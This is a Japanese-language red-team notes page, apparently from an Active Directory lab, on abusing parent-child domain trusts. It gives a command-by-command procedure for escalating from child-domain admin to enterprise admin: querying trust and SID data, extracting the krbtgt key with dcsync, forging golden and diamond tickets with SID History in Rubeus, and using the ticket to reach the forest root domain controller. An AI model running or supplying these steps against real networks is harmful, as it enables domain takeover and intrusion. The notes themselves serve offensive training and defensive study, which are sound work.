既存のツリーに新しいドメインが追加されると、双方向のtransitive trustが自動的に作成される。

TDOで双方向trustをクエリ
```
ladapsearch (objectClass=trustedDomain) --attributes trustPartner, trustDirection, trustAttributes, flatName
```
出力例（Distinguished nameで自分のドメインが確認できる）
```
[*] Distinguished name: DC=dublin,DC=contoso,DC=com
[*] targeting DC: \\dub-dc-1.dublin.contoso.com

~

trustDirection: 3
trustAttributes: 32
flatName: CONTOSO
```

## 悪用
攻撃者がいずれかの子ドメインでドメイン管理者権限を取得できた場合、フォレスト内のエンタープライズ管理者へと権限昇格可能

SID Historyという特殊属性のゴールデンチケットを偽造することで実現'
SID Historyはもともと、ユーザーを別のドメインに移行する際に旧ドメインのリソースへのアクセスを維持するために設計されたもの

子ドメインのSIDを取得(DNは必須)
```
ldapsearch (objectClass=domain) --attributes objectSid --hostname dub-dc-1 --dn DC=dublin,DC=contoso,DC=com
```

親ドメインのSIDを取得(DNは必須)
```
ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
```

krbtgtのaes256が必要なので、dcsyncでとる（ドメインアドミンの権限が必要）
```
dcsync dublin.contoso.com DUBLIN\krbtgt
```

オフラインでゴールデンチケット作成
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
```
各パラメータの意味：

| パラメータ     | 意味                            |
| --------- | ----------------------------- |
| `/aes256` | 子ドメインの `krbtgt` アカウントのAESハッシュ |
| `/user`   | なりすますユーザー名                    |
| `/domain` | 子ドメイン名                        |
| `/sid`    | 子ドメインのSID                     |
| `/sids`   | チケットのSID Historyに追加するSIDのリスト  |

ダイヤモンドチケット手法の場合
```
execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-...-512 /krbkey:2eabe... /nowrap
```

|パラメータ|意味|
|---|---|
|`/tgtdeleg`|現在のユーザーの有効なTGTを取得|
|`/ticketuser`|なりすますユーザー名|
|`/ticketuserid`|なりすますユーザーのRID|
|`/sids`|チケットのSID Historyに追加するSIDのリスト|
|`/krbkey`|子ドメインの `krbtgt` アカウントのAES256ハッシュ|
チケットをログオンセッションに注入すると、フォレストルートドメインコントローラーへのアクセスが可能

DUBLINのAdministratorのトークンを作成
```
make_token DUBLIN\Administrator Fakepass
```

チケットを使用
```
kerberos_ticket_use <ゴールデンチケットのチケットパス>
```

親ドメインへアクセス
```
ls \\lon-dc-1\c$
```